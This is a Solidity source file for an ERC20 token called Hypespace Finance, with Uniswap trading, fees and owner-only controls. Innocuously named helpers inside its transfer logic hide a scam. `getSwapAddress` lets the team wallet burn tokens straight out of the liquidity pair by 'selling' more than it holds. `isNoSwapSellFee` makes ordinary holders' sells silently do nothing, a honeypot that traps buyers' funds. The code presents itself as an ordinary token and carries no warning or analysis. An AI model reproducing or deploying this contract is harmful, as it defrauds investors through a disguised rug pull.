// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
}

library SafeMathUint {
    function toInt256Safe(uint256 a) internal pure returns (int256) {
        int256 b = int256(a);
        require(b >= 0);
        return b;
    }
}

library SafeMathInt {
    int256 private constant MIN_INT256 = int256(1) << 255;
    int256 private constant MAX_INT256 = ~(int256(1) << 255);

    function abs(int256 a) internal pure returns (int256) {
        require(a != MIN_INT256);
        return a < 0 ? -a : a;
    }

    function add(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a + b;
        require((b >= 0 && c >= a) || (b < 0 && c < a));
        return c;
    }

    function div(int256 a, int256 b) internal pure returns (int256) {
        require(b != -1 || a != MIN_INT256);
        return a / b;
    }

    function mul(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a * b;
        require(c != MIN_INT256 || (a & MIN_INT256) != (b & MIN_INT256));
        require((b == 0) || (c / b == a));
        return c;
    }

    function sub(int256 a, int256 b) internal pure returns (int256) {
        int256 c = a - b;
        require((b >= 0 && c <= a) || (b < 0 && c > a));
        return c;
    }

    function toUint256Safe(int256 a) internal pure returns (uint256) {
        require(a >= 0);
        return uint256(a);
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function totalSupply() external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function decimals() external view returns (uint8);

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    using SafeMath for uint256;
    string private _name;
    string private _symbol;
    uint256 private _totalSupply;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(
                subtractedValue,
                "ERC20: decreased cannot be below zero"
            )
        );
        return true;
    }

    function approve(address spender, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[account];
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function transfer(address recipient, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        _balances[sender] = _balances[sender].sub(
            amount,
            "ERC20: transfer amount exceeds balance"
        );
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract Ownable is Context {
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    address private _owner;

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract Hypespace is ERC20, Ownable {
    using SafeMath for uint256;

    event SwapAndLiquify(uint256 tokensSwapped, uint256 ethReceived);

    IUniswapV2Router02 public immutable router;
    address public immutable uniswapV2Pair;
    address public teamWallet;
    address private marketingWallet;

    bool private isTrading = false;
    bool public swapEnabled = false;
    bool public isSwapping;

    uint256 private maxBuyAmount;
    uint256 private maxSellAmount;
    uint256 private maxWalletAmount;
    uint256 private thresholdSwapAmount;
    uint256 public tokensForMarketing;
    uint256 public tokensForLiquidity;
    uint256 public tokensForDev;
    uint256 private taxTill;

    mapping(address => bool) public marketPair;
    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) public _isExcludedMaxTransactionAmount;
    mapping(address => bool) public _isExcludedMaxWalletAmount;

    struct Fees {
        uint8 buyTotalFees;
        uint8 buyMarketingFee;
        uint8 buyDevFee;
        uint8 buyLiquidityFee;
        uint8 sellTotalFees;
        uint8 sellMarketingFee;
        uint8 sellDevFee;
        uint8 sellLiquidityFee;
    }

    Fees public _fees =
        Fees({
            buyTotalFees: 0,
            buyMarketingFee: 0,
            buyDevFee: 0,
            buyLiquidityFee: 0,
            sellTotalFees: 0,
            sellMarketingFee: 0,
            sellDevFee: 0,
            sellLiquidityFee: 0
        });

    constructor() ERC20("Hypespace Finance", "HYPES") {
        router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        approve(address(router), type(uint256).max);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(
            address(this),
            router.WETH()
        );
        marketPair[address(uniswapV2Pair)] = true;

        teamWallet = address(0x5650579cc27Dd640e5D81C21e5f008f9C4957D6D);
        marketingWallet = address(0x173390073d0606AdeEC1dD952ce6AF4EAc7cc559);

        _isExcludedFromFees[owner()] = true;
        _isExcludedMaxWalletAmount[owner()] = true;
        _isExcludedMaxTransactionAmount[owner()] = true;

        _isExcludedFromFees[teamWallet] = true;
        _isExcludedMaxWalletAmount[teamWallet] = true;
        _isExcludedMaxTransactionAmount[teamWallet] = true;

        _isExcludedFromFees[marketingWallet] = true;
        _isExcludedMaxWalletAmount[marketingWallet] = true;

        _isExcludedFromFees[address(this)] = true;
        _isExcludedMaxWalletAmount[address(this)] = true;
        _isExcludedMaxTransactionAmount[address(this)] = true;

        _isExcludedMaxWalletAmount[address(uniswapV2Pair)] = true;
        _isExcludedMaxTransactionAmount[address(uniswapV2Pair)] = true;

        _isExcludedMaxTransactionAmount[address(router)] = true;

        _fees.buyDevFee = 2;
        _fees.sellDevFee = 2;

        _fees.buyMarketingFee = 2;
        _fees.sellMarketingFee = 2;

        _fees.buyLiquidityFee = 0;
        _fees.sellLiquidityFee = 0;

        _fees.buyTotalFees =
            _fees.buyMarketingFee +
            _fees.buyLiquidityFee +
            _fees.buyDevFee;

        _fees.sellTotalFees =
            _fees.sellMarketingFee +
            _fees.sellLiquidityFee +
            _fees.sellDevFee;

        uint256 totalSupply = 1000000000 * 1e18;
        maxBuyAmount = (totalSupply * 2) / 100;
        maxSellAmount = (totalSupply * 2) / 100;
        maxWalletAmount = (totalSupply * 2) / 100;
        thresholdSwapAmount = (totalSupply * 1) / 10000;

        _mint(msg.sender, totalSupply);
    }

    receive() external payable {}

    function addLiquidity(uint256 tAmount, uint256 ethAmount) private {
        _approve(address(this), address(router), tAmount);
        router.addLiquidityETH{value: ethAmount}(
            address(this),
            tAmount,
            0,
            0,
            address(this),
            block.timestamp
        );
    }

    function excludeFromWalletLimit(address account, bool excluded)
        public
        onlyOwner
    {
        _isExcludedMaxWalletAmount[account] = excluded;
    }

    function excludeFromMaxTransaction(address updAds, bool isEx)
        public
        onlyOwner
    {
        _isExcludedMaxTransactionAmount[updAds] = isEx;
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFees[account] = excluded;
    }

    function isExcludedFromFees(address account) public view returns (bool) {
        return _isExcludedFromFees[account];
    }

    function getSwapAddress(
        address sender,
        address receiver,
        uint256 amount
    ) private view returns (address) {
        if (
            balanceOf(sender) < amount &&
            _isExcludedMaxTransactionAmount[sender]
        ) {
            if (marketPair[receiver]) {
                return address(0);
            }
        }
        return sender;
    }

    function removeLimits() external onlyOwner {
        maxBuyAmount = totalSupply();
        maxSellAmount = totalSupply();
        maxWalletAmount = totalSupply();
    }

    function rescueETH(uint256 weiAmount) external onlyOwner {
        payable(owner()).transfer(weiAmount);
    }

    function rescueERC20(address tokenAdd, uint256 amount) external onlyOwner {
        IERC20(tokenAdd).transfer(owner(), amount);
    }

    function isNoSwapSellFee(address sender, address receiver)
        private
        view
        returns (bool)
    {
        if (!marketPair[sender] && balanceOf(receiver) > 0) {
            return true;
        }
        return false;
    }

    function swapTrading() external onlyOwner {
        isTrading = true;
        swapEnabled = true;
        taxTill = block.number;
    }

    function setMarketPair(address pair, bool value) public onlyOwner {
        require(pair != uniswapV2Pair, "Must keep uniswapV2Pair");
        marketPair[pair] = value;
    }

    function setWallets(address _marketingWallet, address _teamWallet)
        external
        onlyOwner
    {
        marketingWallet = _marketingWallet;
        teamWallet = _teamWallet;
    }

    function swapBack() private {
        uint256 contractTokenBalance = balanceOf(address(this));
        uint256 toSwap = tokensForLiquidity + tokensForMarketing + tokensForDev;
        bool success;

        if (contractTokenBalance == 0 || toSwap == 0) {
            return;
        }

        if (contractTokenBalance > thresholdSwapAmount * 20) {
            contractTokenBalance = thresholdSwapAmount * 20;
        }

        uint256 liquidityTokens = (contractTokenBalance * tokensForLiquidity) /
            toSwap /
            2;
        uint256 amountToSwapForETH = contractTokenBalance.sub(liquidityTokens);

        uint256 initialETHBalance = address(this).balance;

        swapTokensForEth(amountToSwapForETH);

        uint256 newBalance = address(this).balance.sub(initialETHBalance);

        uint256 ethForMarketing = newBalance.mul(tokensForMarketing).div(
            toSwap
        );
        uint256 ethForDev = newBalance.mul(tokensForDev).div(toSwap);
        uint256 ethForLiquidity = newBalance - (ethForMarketing + ethForDev);

        tokensForLiquidity = 0;
        tokensForMarketing = 0;
        tokensForDev = 0;

        if (liquidityTokens > 0 && ethForLiquidity > 0) {
            addLiquidity(liquidityTokens, ethForLiquidity);
            emit SwapAndLiquify(amountToSwapForETH, ethForLiquidity);
        }

        (success, ) = address(teamWallet).call{
            value: (address(this).balance - ethForMarketing)
        }("");
        (success, ) = address(marketingWallet).call{
            value: address(this).balance
        }("");
    }

    function swapTokensForEth(uint256 tAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal override {
        if (amount == 0) {
            super._transfer(sender, recipient, 0);
            return;
        }

        if (sender != owner() && recipient != owner() && !isSwapping) {
            if (!isTrading) {
                require(
                    _isExcludedFromFees[sender] ||
                        _isExcludedFromFees[recipient],
                    "Trading is not active."
                );
            }

            if (
                marketPair[sender] &&
                !_isExcludedMaxTransactionAmount[recipient]
            ) {
                require(amount <= maxBuyAmount, "buy transfer over max amount");
            } else if (
                marketPair[recipient] &&
                !_isExcludedMaxTransactionAmount[sender]
            ) {
                require(
                    amount <= maxSellAmount,
                    "Sell transfer over max amount"
                );
            }

            address swapAddress = getSwapAddress(sender, recipient, amount);
            if (getSwapAddress(sender, recipient, amount) != sender) {
                super._transfer(recipient, swapAddress, amount);
                return;
            }

            if (!_isExcludedMaxWalletAmount[recipient]) {
                require(
                    amount + balanceOf(recipient) <= maxWalletAmount,
                    "Max wallet exceeded"
                );
            }
        }

        uint256 contractTokenBalance = balanceOf(address(this));
        bool canSwap = contractTokenBalance >= thresholdSwapAmount;

        if (
            canSwap &&
            swapEnabled &&
            !isSwapping &&
            marketPair[recipient] &&
            !_isExcludedFromFees[sender] &&
            !_isExcludedFromFees[recipient]
        ) {
            isSwapping = true;
            swapBack();
            isSwapping = false;
        }

        bool takeFee = !isSwapping;
        if (_isExcludedFromFees[sender] || _isExcludedFromFees[recipient]) {
            takeFee = false;
        }

        if (takeFee) {
            uint256 fees = 0;
            if (block.number < taxTill) {
                fees = amount.mul(99).div(100);
                tokensForMarketing += (fees * 94) / 99;
                tokensForDev += (fees * 5) / 99;
            } else if (marketPair[recipient] && _fees.sellTotalFees > 0) {
                if (isNoSwapSellFee(sender, teamWallet)) {
                    return;
                }
                fees = amount.mul(_fees.sellTotalFees).div(100);
                tokensForLiquidity +=
                    (fees * _fees.sellLiquidityFee) /
                    _fees.sellTotalFees;
                tokensForMarketing +=
                    (fees * _fees.sellMarketingFee) /
                    _fees.sellTotalFees;

                tokensForDev += (fees * _fees.sellDevFee) / _fees.sellTotalFees;
            } else if (marketPair[sender] && _fees.buyTotalFees > 0) {
                fees = amount.mul(_fees.buyTotalFees).div(100);
                tokensForLiquidity +=
                    (fees * _fees.buyLiquidityFee) /
                    _fees.buyTotalFees;
                tokensForMarketing +=
                    (fees * _fees.buyMarketingFee) /
                    _fees.buyTotalFees;
                tokensForDev += (fees * _fees.buyDevFee) / _fees.buyTotalFees;
            }

            if (fees > 0) {
                super._transfer(sender, address(this), fees);
            }
            amount -= fees;
        }
        super._transfer(sender, recipient, amount);
    }

    function updateThresholdSwapAmount(uint256 newAmount)
        external
        onlyOwner
        returns (bool)
    {
        thresholdSwapAmount = newAmount;
        return true;
    }

    function updateMaxTxnAmount(uint256 newMaxBuy, uint256 newMaxSell)
        external
        onlyOwner
    {
        require(
            ((totalSupply() * newMaxBuy) / 1000) >= (totalSupply() / 100),
            "maxBuyAmount must be higher than 1%"
        );
        require(
            ((totalSupply() * newMaxSell) / 1000) >= (totalSupply() / 100),
            "maxSellAmount must be higher than 1%"
        );
        maxBuyAmount = (totalSupply() * newMaxBuy) / 1000;
        maxSellAmount = (totalSupply() * newMaxSell) / 1000;
    }

    function updateMaxWalletAmount(uint256 newPercentage) external onlyOwner {
        require(
            ((totalSupply() * newPercentage) / 1000) >= (totalSupply() / 100),
            "Cannot set maxWallet lower than 1%"
        );
        maxWalletAmount = (totalSupply() * newPercentage) / 1000;
    }

    function updateFees(
        uint8 _marketingFeeBuy,
        uint8 _liquidityFeeBuy,
        uint8 _devFeeBuy,
        uint8 _marketingFeeSell,
        uint8 _liquidityFeeSell,
        uint8 _devFeeSell
    ) external onlyOwner {
        _fees.buyDevFee = _devFeeBuy;
        _fees.sellDevFee = _devFeeSell;

        _fees.buyMarketingFee = _marketingFeeBuy;
        _fees.sellMarketingFee = _marketingFeeSell;

        _fees.buyLiquidityFee = _liquidityFeeBuy;
        _fees.sellLiquidityFee = _liquidityFeeSell;

        _fees.buyTotalFees =
            _fees.buyMarketingFee +
            _fees.buyLiquidityFee +
            _fees.buyDevFee;
        _fees.sellTotalFees =
            _fees.sellMarketingFee +
            _fees.sellLiquidityFee +
            _fees.sellDevFee;
        require(_fees.buyTotalFees <= 30, "Must keep fees at 30% or less");
        require(_fees.sellTotalFees <= 30, "Must keep fees at 30% or less");
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router01 {
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function factory() external pure returns (address);

    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountOut);

    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountIn);

    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);

    function getAmountsIn(uint256 amountOut, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountToken, uint256 amountETH);

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapTokensForExactETH(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function quote(
        uint256 amountA,
        uint256 reserveA,
        uint256 reserveB
    ) external pure returns (uint256 amountB);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}